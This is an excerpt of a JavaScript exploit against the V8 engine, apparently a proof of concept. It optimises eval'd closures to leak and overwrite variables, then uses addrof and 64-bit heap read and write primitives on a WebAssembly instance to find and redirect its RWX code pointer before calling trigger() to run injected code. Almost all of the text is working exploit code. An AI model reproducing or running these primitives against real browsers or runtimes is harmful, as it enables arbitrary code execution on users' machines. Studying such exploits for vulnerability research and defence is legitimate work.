...
eval(`let f; switch(0){case 0: with({}) 0; try{throw 0;}catch(y){ f = function(){ return v100; }; } globalThis.leak126=f; }`);
eval(`let f; switch(0){case 0: with({}) 0; try{throw 0;}catch(y){ f = function(){ return v102; }; } globalThis.leak128=f; }`);
%PrepareFunctionForOptimization(leak126);
%OptimizeFunctionOnNextCall(leak126);
globalThis.map126 = leak126();
%PrepareFunctionForOptimization(leak128);
%OptimizeFunctionOnNextCall(leak128);
globalThis.map128 = leak128();
eval(`let f; switch(0){case 0: with({}) 0; try{throw 0;}catch(y){ f = function(){ v100 = globalThis.payload; return 0; }; } globalThis.write126=f; }`);
eval(`let f; switch(0){case 0: with({}) 0; try{throw 0;}catch(y){ f = function(){ v102 = globalThis.payload; return 0; }; } globalThis.write128=f; }`);
...
var inst_addr = addrof(wasm_instance);

const rwx_addr_leak = (heapRead64(inst_addr+0x8n+0x4n) & 0xffffffffn)+ 8n * 5n;
console.log(hex64(rwx_addr_leak));
const rwx_leak = heapRead64(rwx_addr_leak);
console.log(hex64(rwx_leak));
heapWrite64(rwx_addr_leak, 0, rwx_leak + 0xa1en);
console.log(hex64(rwx_leak + 0xa1en));
trigger();